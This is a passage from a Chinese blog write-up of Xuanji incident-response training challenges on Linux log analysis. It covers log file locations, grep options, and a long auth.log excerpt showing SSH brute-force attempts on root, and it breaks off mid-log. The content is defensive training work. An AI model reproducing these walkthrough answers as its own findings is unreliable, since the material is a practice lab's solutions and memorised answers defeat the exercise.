class="toc-link" href="#netstat-%E5%91%BD%E4%BB%A4"><span class="toc-number">2.0.3.8.</span> <span class="toc-text">netstat 命令</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%97%AE%E9%A2%985%E9%BB%91%E5%AE%A2%E7%95%99%E4%B8%8B%E4%BA%86%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6%EF%BC%8C%E8%AF%B7%E6%89%BE%E5%87%BA%E9%BB%91%E5%AE%A2%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BC%80%E5%90%AF%E7%9A%84%E7%9B%91%E7%AB%AF%E5%8F%A3%E6%8F%90%E4%BA%A4"><span class="toc-number">2.0.3.8.1.</span> <span class="toc-text">问题5黑客留下了木马文件，请找出黑客服务器开启的监端口提交</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3%E5%8F%B7%EF%BC%9F"><span class="toc-number">2.0.3.9.</span> <span class="toc-text">什么是监听端口号？</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E6%8E%92%E6%9F%A5"><span class="toc-number">2.0.4.</span> <span class="toc-text">工具排查</span></a></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        玄机第一章应急响应(二刷已完)
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">wanTh3flag</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-04-21T08:24:45.000Z" class="dt-published" itemprop="datePublished">2025-04-21</time>
        
        (Updated: <time datetime="2025-05-16T03:40:11.470Z" class="dt-updated" itemprop="dateModified">2025-05-16</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/%E7%8E%84%E6%9C%BA/">玄机</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" rel="tag">玄机第一章应急响应</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h1><p>在刷ctfshow的空闲时间里做一些玄机的安全日志和应急响应方面的题目，也算是更偏向于实践中的一些防守措施吧,不过第一章都是借鉴着师傅的wp进行实践学习的</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/administratorlws/article/details/139560740?ops_request_misc=%7B%22request_id%22:%22b99b24403d7f7572af4ea5e29fd9f779%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=b99b24403d7f7572af4ea5e29fd9f779&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-139560740-null-null.nonecase&utm_term=%E7%AC%AC%E4%B8%80%E7%AB%A0&spm=1018.2226.3001.4450">玄机——第一章 应急响应-Linux日志分析 wp_玄机linux日志分析-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/administratorlws/article/details/139577643?ops_request_misc=%7B%22request_id%22:%22b99b24403d7f7572af4ea5e29fd9f779%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=b99b24403d7f7572af4ea5e29fd9f779&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-139577643-null-null.nonecase&utm_term=%E7%AC%AC%E4%B8%80%E7%AB%A0&spm=1018.2226.3001.4450">玄机——第一章 应急响应- Linux入侵排查 wp_玄机应急-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/administratorlws/article/details/139521078?ops_request_misc=%7B%22request_id%22:%22b99b24403d7f7572af4ea5e29fd9f779%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=b99b24403d7f7572af4ea5e29fd9f779&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-3-139521078-null-null.nonecase&utm_term=%E7%AC%AC%E4%B8%80%E7%AB%A0&spm=1018.2226.3001.4450">玄机——第一章 应急响应-webshell查杀 wp（手把手保姆级教学）-CSDN博客</a></p>
<h1 id="0x02正文"><a href="#0x02正文" class="headerlink" title="0x02正文"></a>0x02正文</h1><h3 id="第一章-应急响应-Linux日志分析"><a href="#第一章-应急响应-Linux日志分析" class="headerlink" title="第一章 应急响应-Linux日志分析"></a>第一章 应急响应-Linux日志分析</h3><h4 id="什么是Linux日志分析"><a href="#什么是Linux日志分析" class="headerlink" title="什么是Linux日志分析"></a>什么是Linux日志分析</h4><p>Linux日志分析是指对Linux系统中生成的日志文件进行检查、监控和分析的过程。在Linux系统中，各种服务和应用程序会产生日志文件，记录系统运行状态、用户操作、系统错误、安全事件等信息。分析这些日志可以帮助系统管理员理解系统的运行状况，诊断问题，并确保系统的安全和稳定运行。日志分析可以手动进行，也可以使用各种日志分析工具来自动化这一过程。常见的日志文件包括系统日志（&#x2F;var&#x2F;log&#x2F;syslog 或 &#x2F;var&#x2F;log&#x2F;messages）、认证日志（&#x2F;var&#x2F;log&#x2F;auth.log）、应用程序日志等。</p>
<h4 id="常见日志文件"><a href="#常见日志文件" class="headerlink" title="常见日志文件"></a>常见日志文件</h4><p>Linux系统中的日志文件通常存储在 &#x2F;var&#x2F;log 目录下，常见的日志文件包括：</p>
<table>
<thead>
<tr>
<th>日志文件</th>
<th>文件说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>&#x2F;var&#x2F;log&#x2F;cron</strong></td>
<td>记录了系统定时任务相关的日志。</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;cups</td>
<td>记录打印信息的日志。</td>
</tr>
<tr>
<td><strong>&#x2F;var&#x2F;log&#x2F;dmesg</strong></td>
<td>记录了系统在开机时内核自检的信息，也可以使用 dmesg 命令直接查看内核自检信息。</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;mailog</td>
<td>记录邮件信息。</td>
</tr>
<tr>
<td><strong>&#x2F;var&#x2F;log&#x2F;message</strong></td>
<td>记录系统重要信息的日志。这个日志文件中会记录 Linux 系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件。</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;btmp</td>
<td>记录错误登录日志，这个文件是二进制文件，不能直接 vim 查看，而要使用 <code>lastb</code> 命令查看。</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;lastlog</td>
<td>记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接 vim ，而要使用 <code>lastlog</code> 命令查看。</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;wtmp</td>
<td>永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接 vim ，而需要使用 <code>last</code> 命令来查看。</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;run&#x2F;utmp</td>
<td>记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接 vim ，而要使用 <code>w</code> ， <code>who</code> ， <code>users</code>等命令来查询。</td>
</tr>
<tr>
<td><strong>&#x2F;var&#x2F;log&#x2F;secure</strong></td>
<td>记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如 SSH 登录，su 切换用户，sudo 授权，甚至添加用户和修改用户密码都会记录在这个日志文件中。</td>
</tr>
</tbody></table>
<h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><p><code>grep</code> 、 <code>sed</code> 、 <code>awk</code> 、 <code>find</code> 、<code>netstat</code> 等</p>
<p>查找文件中的关键字</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep [选项] &quot;搜索模式&quot; [文件或目录]</span><br></pre></td></tr></table></figure>

<p>grep常见选项</p>
<table>
<thead>
<tr>
<th><code>-i</code></th>
<th>忽略大小写（如 <code>grep -i &quot;error&quot; file.txt</code>）。</th>
</tr>
</thead>
<tbody><tr>
<td><code>-v</code></td>
<td><strong>反向匹配</strong>，显示<strong>不包含</strong>模式的行（如 <code>grep -v &quot;success&quot; file.txt</code>）。</td>
</tr>
<tr>
<td><code>-n</code></td>
<td>显示匹配行的行号（如 <code>grep -n &quot;warning&quot; file.txt</code>）。</td>
</tr>
<tr>
<td><code>-c</code></td>
<td>统计匹配行的数量（如 <code>grep -c &quot;404&quot; access.log</code>）。</td>
</tr>
<tr>
<td><code>-r</code> 或 <code>-R</code></td>
<td>递归搜索目录下的所有文件（如 <code>grep -r &quot;main&quot; /src/</code>）。</td>
</tr>
<tr>
<td><code>-l</code></td>
<td>仅显示包含匹配项的文件名（如 <code>grep -l &quot;TODO&quot; *.py</code>）。</td>
</tr>
<tr>
<td><code>-w</code></td>
<td>全词匹配（如 <code>grep -w &quot;root&quot; auth.log</code> 不匹配 <code>rooted</code>）。</td>
</tr>
<tr>
<td><code>-A NUM</code></td>
<td>显示匹配行及其后<strong>NUM行</strong>（如 <code>grep -A 3 &quot;panic&quot; syslog</code>）。</td>
</tr>
<tr>
<td><code>-B NUM</code></td>
<td>显示匹配行及其前<strong>NUM行</strong>（如 <code>grep -B 2 &quot;error&quot; app.log</code>）。</td>
</tr>
<tr>
<td><code>-C NUM</code></td>
<td>显示匹配行及其前后各<strong>NUM行</strong>（上下文）。</td>
</tr>
<tr>
<td><code>-e</code></td>
<td>指定多个模式（如 <code>grep -e &quot;error&quot; -e &quot;fail&quot; file.txt</code>）。</td>
</tr>
<tr>
<td><code>-E</code></td>
<td>启用扩展正则表达式（等同于 <code>egrep</code>）。</td>
</tr>
<tr>
<td><code>-F</code></td>
<td>按字面字符串匹配（禁用正则表达式，速度快）。</td>
</tr>
<tr>
<td><code>--color=auto</code></td>
<td>高亮显示匹配内容（默认已启用）。</td>
</tr>
<tr>
<td>-a</td>
<td>选项表示将文件内容视为文本文件</td>
</tr>
</tbody></table>
<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>我们先看这道题的任务</p>
<p><img src="/./../image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/image-20241116182821625.png" alt="image-20241116182821625"></p>
<h5 id="连接主机"><a href="#连接主机" class="headerlink" title="连接主机"></a>连接主机</h5><p>那我们先ssh连接一下目标ip</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@ip</span><br></pre></td></tr></table></figure>

<p> <strong>命令解释</strong></p>
<ul>
<li><code>ssh</code>: 这是启动 SSH 客户端的命令。</li>
<li><code>root</code>: 这是你要以其身份登录的用户名。在这个例子中，是根用户（root）。</li>
<li><code>IP</code>: 这是目标服务器的 IP 地址或主机名。</li>
</ul>
<h5 id="问题1-查看有多少IP在爆破主机ssh的root帐号"><a href="#问题1-查看有多少IP在爆破主机ssh的root帐号" class="headerlink" title="问题1:查看有多少IP在爆破主机ssh的root帐号"></a>问题1:查看有多少IP在爆破主机ssh的root帐号</h5><p>遇到这种问题我们应该怎么解决?</p>
<p>首先，我们应该先找到我们日志的文件，一般来说ssh登录尝试都会记录在&#x2F;var&#x2F;log&#x2F;auth.log.1（这是固定的）</p>
<p>这个日志文件的组成结构</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">月 日 时间 主机名 进程名[PID]: 事件类型: 详细信息</span><br></pre></td></tr></table></figure>

<p>常见的内容有：</p>
<ul>
<li><p>成功登录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Aug 10 14:22:35 server sshd[1234]: Accepted password for user1 from 192.168.1.100 port 22 ssh2</span><br><span class="line">Aug 10 14:23:01 server sshd[1235]: Accepted publickey for user2 from 192.168.1.101 port 22</span><br></pre></td></tr></table></figure>
</li>
<li><p>登录失败</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Aug 10 14:24:10 server sshd[1236]: Failed password for invalid_user from 192.168.1.200 port 22</span><br><span class="line">Aug 10 14:25:45 server sshd[1237]: Connection closed by authenticating user user1 192.168.1.100 port 22 [preauth]</span><br></pre></td></tr></table></figure>
</li>
<li><p>暴力破解痕迹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Aug 10 14:30:00 server sshd[1240]: Received disconnect from 192.168.1.200: 3: Authentication failed [preauth]</span><br><span class="line">Aug 10 14:31:12 server sshd[1241]: Disconnecting: Too many authentication failures for user1 [preauth]</span><br></pre></td></tr></table></figure></li>
</ul>
<p>我们先cat查看一下auth.log.1的内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line">Aug  1 07:40:47 linux-rz sshd[7461]: Invalid user test1 from 192.168.200.35 port 33874</span><br><span class="line">Aug  1 07:40:48 linux-rz sshd[7461]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:40:48 linux-rz sshd[7461]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.35</span><br><span class="line">Aug  1 07:40:50 linux-rz sshd[7461]: Failed password for invalid user test1 from 192.168.200.35 port 33874 ssh2</span><br><span class="line">Aug  1 07:40:52 linux-rz sshd[7461]: Connection closed by invalid user test1 192.168.200.35 port 33874 [preauth]</span><br><span class="line">Aug  1 07:40:58 linux-rz sshd[7465]: Invalid user test2 from 192.168.200.35 port 51640</span><br><span class="line">Aug  1 07:41:01 linux-rz sshd[7465]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:41:01 linux-rz sshd[7465]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.35</span><br><span class="line">Aug  1 07:41:04 linux-rz sshd[7465]: Failed password for invalid user test2 from 192.168.200.35 port 51640 ssh2</span><br><span class="line">Aug  1 07:41:07 linux-rz sshd[7465]: Connection closed by invalid user test2 192.168.200.35 port 51640 [preauth]</span><br><span class="line">Aug  1 07:41:09 linux-rz sshd[7468]: Invalid user test3 from 192.168.200.35 port 48168</span><br><span class="line">Aug  1 07:41:11 linux-rz sshd[7468]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:41:11 linux-rz sshd[7468]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.35</span><br><span class="line">Aug  1 07:41:13 linux-rz sshd[7468]: Failed password for invalid user test3 from 192.168.200.35 port 48168 ssh2</span><br><span class="line">Aug  1 07:41:19 linux-rz sshd[7468]: Connection closed by invalid user test3 192.168.200.35 port 48168 [preauth]</span><br><span class="line">Aug  1 07:42:30 linux-rz sshd[7471]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.32  user=root</span><br><span class="line">Aug  1 07:42:32 linux-rz sshd[7471]: Failed password for root from 192.168.200.32 port 51888 ssh2</span><br><span class="line">Aug  1 07:42:33 linux-rz sshd[7471]: Connection closed by authenticating user root 192.168.200.32 port 51888 [preauth]</span><br><span class="line">Aug  1 07:42:49 linux-rz sshd[7288]: Received disconnect from 192.168.200.2 port 54682:11: disconnected by user</span><br><span class="line">Aug  1 07:42:49 linux-rz sshd[7288]: Disconnected from user root 192.168.200.2 port 54682</span><br><span class="line">Aug  1 07:42:49 linux-rz sshd[7288]: pam_unix(sshd:session): session closed for user root</span><br><span class="line">Aug  1 07:42:49 linux-rz systemd-logind[440]: Session 6 logged out. Waiting for processes to exit.</span><br><span class="line">Aug  1 07:42:49 linux-rz systemd-logind[440]: Removed session 6.</span><br><span class="line">Aug  1 07:46:39 linux-rz sshd[7475]: Invalid user user from 192.168.200.2 port 36149</span><br><span class="line">Aug  1 07:46:39 linux-rz sshd[7475]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:46:39 linux-rz sshd[7475]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2</span><br><span class="line">Aug  1 07:46:41 linux-rz sshd[7475]: Failed password for invalid user user from 192.168.200.2 port 36149 ssh2</span><br><span class="line">Aug  1 07:46:45 linux-rz sshd[7475]: Connection closed by invalid user user 192.168.200.2 port 36149 [preauth]</span><br><span class="line">Aug  1 07:46:45 linux-rz sshd[7478]: Invalid user user from 192.168.200.2 port 44425</span><br><span class="line">Aug  1 07:46:45 linux-rz sshd[7478]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:46:45 linux-rz sshd[7478]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2</span><br><span class="line">Aug  1 07:46:47 linux-rz sshd[7478]: Failed password for invalid user user from 192.168.200.2 port 44425 ssh2</span><br><span class="line">Aug  1 07:46:48 linux-rz sshd[7478]: Connection closed by invalid user user 192.168.200.2 port 44425 [preauth]</span><br><span class="line">Aug  1 07:46:48 linux-rz sshd[7480]: Invalid user user from 192.168.200.2 port 38791</span><br><span class="line">Aug  1 07:46:48 linux-rz sshd[7480]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:46:48 linux-rz sshd[7480]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2</span><br><span class="line">Aug  1 07:46:50 linux-rz sshd[7480]: Failed password for invalid user user from 192.168.200.2 port 38791 ssh2</span><br><span class="line">Aug  1 07:46:52 linux-rz sshd[7480]: Connection closed by invalid user user 192.168.200.2 port 38791 [preauth]</span><br><span class="line">Aug  1 07:46:52 linux-rz sshd[7482]: Invalid user user from 192.168.200.2 port 37489</span><br><span class="line">Aug  1 07:46:52 linux-rz sshd[7482]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:46:52 linux-rz sshd[7482]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2</span><br><span class="line">Aug  1 07:46:54 linux-rz sshd[7482]: Failed password for invalid user user from 192.168.200.2 port 37489 ssh2</span><br><span class="line">Aug  1 07:46:54 linux-rz sshd[7482]: Connection closed by invalid user user 192.168.200.2 port 37489 [preauth]</span><br><span class="line">Aug  1 07:46:54 linux-rz sshd[7484]: Invalid user user from 192.168.200.2 port 35575</span><br><span class="line">Aug  1 07:46:54 linux-rz sshd[7484]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:46:54 linux-rz sshd[7484]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2</span><br><span class="line">Aug  1 07:46:56 linux-rz sshd[7484]: Failed password for invalid user user from 192.168.200.2 port 35575 ssh2</span><br><span class="line">Aug  1 07:46:57 linux-rz sshd[7484]: Connection closed by invalid user user 192.168.200.2 port 35575 [preauth]</span><br><span class="line">Aug  1 07:46:57 linux-rz sshd[7486]: Invalid user hello from 192.168.200.2 port 35833</span><br><span class="line">Aug  1 07:46:57 linux-rz sshd[7486]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:46:57 linux-rz sshd[7486]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2</span><br><span class="line">Aug  1 07:46:59 linux-rz sshd[7486]: Failed password for invalid user hello from 192.168.200.2 port 35833 ssh2</span><br><span class="line">Aug  1 07:46:59 linux-rz sshd[7486]: Connection closed by invalid user hello 192.168.200.2 port 35833 [preauth]</span><br><span class="line">Aug  1 07:47:00 linux-rz sshd[7489]: Invalid user hello from 192.168.200.2 port 37653</span><br><span class="line">Aug  1 07:47:00 linux-rz sshd[7489]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:47:00 linux-rz sshd[7489]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2</span><br><span class="line">Aug  1 07:47:02 linux-rz sshd[7489]: Failed password for invalid user hello from 192.168.200.2 port 37653 ssh2</span><br><span class="line">Aug  1 07:47:02 linux-rz sshd[7489]: Connection closed by invalid user hello 192.168.200.2 port 37653 [preauth]</span><br><span class="line">Aug  1 07:47:02 linux-rz sshd[7491]: Invalid user hello from 192.168.200.2 port 37917</span><br><span class="line">Aug  1 07:47:02 linux-rz sshd[7491]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:47:02 linux-rz sshd[7491]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2</span><br><span class="line">Aug  1 07:47:04 linux-rz sshd[7491]: Failed password for invalid user hello from 192.168.200.2 port 37917 ssh2</span><br><span class="line">Aug  1 07:47:05 linux-rz sshd[7491]: Connection closed by invalid user hello 192.168.200.2 port 37917 [preauth]</span><br><span class="line">Aug  1 07:47:05 linux-rz sshd[7493]: Invalid user hello from 192.168.200.2 port 41957</span><br><span class="line">Aug  1 07:47:05 linux-rz sshd[7493]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:47:05 linux-rz sshd[7493]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2</span><br><span class="line">Aug  1 07:47:08 linux-rz sshd[7493]: Failed password for invalid user hello from 192.168.200.2 port 41957 ssh2</span><br><span class="line">Aug  1 07:47:08 linux-rz sshd[7493]: Connection closed by invalid user hello 192.168.200.2 port 41957 [preauth]</span><br><span class="line">Aug  1 07:47:08 linux-rz sshd[7495]: Invalid user hello from 192.168.200.2 port 39685</span><br><span class="line">Aug  1 07:47:08 linux-rz sshd[7495]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:47:08 linux-rz sshd[7495]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2</span><br><span class="line">Aug  1 07:47:10 linux-rz sshd[7495]: Failed password for invalid user hello from 192.168.200.2 port 39685 ssh2</span><br><span class="line">Aug  1 07:47:11 linux-rz sshd[7495]: Connection closed by invalid user hello 192.168.200.2 port 39685 [preauth]</span><br><span class="line">Aug  1 07:47:11 linux-rz sshd[7497]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2  user=root</span><br><span class="line">Aug  1 07:47:13 linux-rz sshd[7497]: Failed password for root from 192.168.200.2 port 34703 ssh2</span><br><span class="line">Aug  1 07:47:15 linux-rz sshd[7497]: Connection closed by authenticating user root 192.168.200.2 port 34703 [preauth]</span><br><span class="line">Aug  1 07:47:16 linux-rz sshd[7499]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2  user=root</span><br><span class="line">Aug  1 07:47:18 linux-rz sshd[7499]: Failed password for root from 192.168.200.2 port 46671 ssh2</span><br><span class="line">Aug  1 07:47:18 linux-rz sshd[7499]: Connection closed by authenticating user root 192.168.200.2 port 46671 [preauth]</span><br><span class="line">Aug  1 07:47:18 linux-rz sshd[7501]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2  user=root</span><br><span class="line">Aug  1 07:47:20 linux-rz sshd[7501]: Failed password for root from 192.168.200.2 port 39967 ssh2</span><br><span class="line">Aug  1 07:47:20 linux-rz sshd[7501]: Connection closed by authenticating user root 192.168.200.2 port 39967 [preauth]</span><br><span class="line">Aug  1 07:47:20 linux-rz sshd[7503]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2  user=root</span><br><span class="line">Aug  1 07:47:22 linux-rz sshd[7503]: Failed password for root from 192.168.200.2 port 46647 ssh2</span><br><span class="line">Aug  1 07:47:23 linux-rz sshd[7503]: Connection closed by authenticating user root 192.168.200.2 port 46647 [preauth]</span><br><span class="line">Aug  1 07:47:23 linux-rz sshd[7505]: Accepted password for root from 192.168.200.2 port 46563 ssh2</span><br><span class="line">Aug  1 07:47:23 linux-rz sshd[7505]: pam_unix(sshd:session): session opened for user root by (uid=0)</span><br><span class="line">Aug  1 07:47:23 linux-rz systemd-logind[440]: New session 7 of user root.</span><br><span class="line">Aug  1 07:47:23 linux-rz sshd[7525]: Invalid user  from 192.168.200.2 port 37013</span><br><span class="line">Aug  1 07:47:23 linux-rz sshd[7525]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug  1 07:47:23 linux-rz sshd[7525]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2</span><br><span class="line">Aug  1 07:47:26 linux-rz sshd[7525]: Failed password for invalid user  from 192.168.200.2 port 37013 ssh2</span><br><span class="line">Aug  1 07:47:28 linux-rz sshd[7525]: Connection closed by invalid user  192.168.200.2 port 37013 [preauth]</span><br><span class="line">Aug  1 07:47:28 linux-rz sshd[7528]: Invalid user  from 192.168.200.2 port 37545</span><br><span 